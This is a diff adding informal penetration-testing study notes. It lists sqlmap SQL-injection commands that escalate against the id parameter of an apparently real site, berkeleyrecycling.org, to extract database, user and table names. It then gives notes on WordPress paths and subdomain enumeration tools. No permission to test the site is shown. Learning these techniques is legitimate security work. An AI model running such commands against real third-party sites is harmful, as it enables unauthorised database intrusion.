@@ -1,0 +1,52 @@
+SQL map i used to perform automates sql injection vuln testing
+built in kali linux
+
+commands:
+
+#sqlmap -u http://berkeleyrecycling.org/page.php?id=1
+
+#sqlmap -u http://berkeleyrecycling.org/page.php?id=1 --level=2 --risk=2
+
+#sqlmap -u http://berkeleyrecycling.org/page.php?id=1 --level=2 --risk=2 --currentdb
+
+#sqlmap -u http://berkeleyrecycling.org/page.php?id=1 --level=2 --risk=2 --currentdb --currentuser
+
+#sqlmap -u http://berkeleyrecycling.org/page.php?id=1 --level=2 --risk=2 --currentdb --tables
+
+finding vuln using id parameter
+
+level:level of test to perform
+risk:level of risk to perform
+
+Enumeration : active interaction with the service to get data is called the enumeration
+
+GHDB :
+https://exploit-db.com
+
+
+
+
+Wordpress and its alternatives :
+Wordpress
+default folders in wordpress : 
+	/wp-admin
+	/wp-content
+	/wp-uploads
+joomla
+drupal
+
+SUb domain enumeration should be performed on both active and inactive sub doamins
+
+Sub domains:
+active
+inactive
+
+platofrms for sub domain enumeration
+
+virustotal.com - gives only active subdomains
+crt.sh - gives both active and inactie domains
+sublister - pyhton tool
+subbrute
+amass subdomain enum enumerator
+ 
+
